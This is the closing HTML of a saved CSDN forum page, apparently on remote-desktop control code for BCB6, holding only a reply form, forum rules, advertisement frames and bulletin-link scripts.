+<DIV class="pub"><SPAN class="fr">每天回帖即可获得10分可用分！小技巧：<A href="http://bbs.csdn.net/help#common_problem" 
+target="_blank">教您如何更快获得可用分</A> <SPAN id="body_count_notice" class="body_count_notice_fixed">你还可以输入10000个字符</SPAN></SPAN><INPUT id="submit_new_post_form" class="btn_b" name="commit" value="提交回复" type="submit">(Ctrl+Enter)</DIV></DIV>
+<OL class="notice">
+  <LI>这里发言，表示您接受了CSDN论坛的用户<A href="http://bbs.csdn.net/help#user_criterion" 
+  target="_blank">行为准则</A>。</LI>
+  <LI>请对您的言行负责，并遵守中华人民共和国有关法律法规,尊重网上道德。</LI>
+  <LI>转载文章请注明出自“CSDN（www.csdn.net）”。如是商业用途请联系原作者。</LI></OL></FORM>
+<SCRIPT id="countTemplate" type="text/x-jquery-tmpl">
+        你还可以输入${count}个字符
+      </SCRIPT>
+</DIV></DIV><!-- 对联广告 -->
+<DIV style="left: 10px; top: 184px; width: 120px; position: absolute;" id="ad_left"><A 
+style="float: right;" onclick="javascript:this.parentNode.style.display='none';return false;" 
+href="http://bbs.csdn.net/topics/350001529#">[关闭]</A><IFRAME height="600" src="注释详细BCB6下的远程桌面控制的代码程序_files/TopicBodyBottom.htm" 
+frameBorder="0" width="120"></IFRAME></DIV>
+<DIV style="top: 184px; width: 120px; right: 10px; position: absolute;" id="ad_right"><A 
+style="float: left;" onclick="javascript:this.parentNode.style.display='none';return false;" 
+href="http://bbs.csdn.net/topics/350001529#">[关闭]</A><IFRAME height="600" src="注释详细BCB6下的远程桌面控制的代码程序_files/TopicDaLeft.htm" 
+frameBorder="0" width="120"></IFRAME></DIV>
+<SCRIPT type="text/javascript" src="注释详细BCB6下的远程桌面控制的代码程序_files/publib_footer.js"></SCRIPT>
+</DIV>
+<SCRIPT type="text/javascript">
+        $(function(){ posts_page_js._form_page(); });
+      </SCRIPT>
+
+<SCRIPT language="javascript" type="text/javascript" charset="utf-8">
+//<![CDATA[
+$(function(){
+  topics_page_js.show_page();
+    var bulletin_link = '<a href="http://bbs.csdn.net/topics/390272755" style="color: red; font-weight: bold" target="_blank">“Hadoop&amp;BigData 技术赢门票”活动正式启动</a>'
+    $('#post-forum-bulletin-1').html(bulletin_link);
+    var bulletin_link = '<a href="http://bbs.csdn.net/topics/390274318" style="color: red; font-weight: bold" target="_blank">CSDN论坛十一月“找bug 赢可用分”活动火热进行中</a>'
+    $('#post-forum-bulletin-2').html(bulletin_link);
+    var bulletin_link = '<a href="http://bbs.csdn.net/topics/390273628" style="color: blue; font-weight: bold" target="_blank">2012中国信息产业经济年会-----在线轻松报名！</a>'
+    $('#post-forum-bulletin-3').html(bulletin_link);
+});
+//]]>
+</SCRIPT>
+
+<SCRIPT type="text/javascript" src="注释详细BCB6下的远程桌面控制的代码程序_files/ad-bbs.js"></SCRIPT>
+</BODY></HTML>
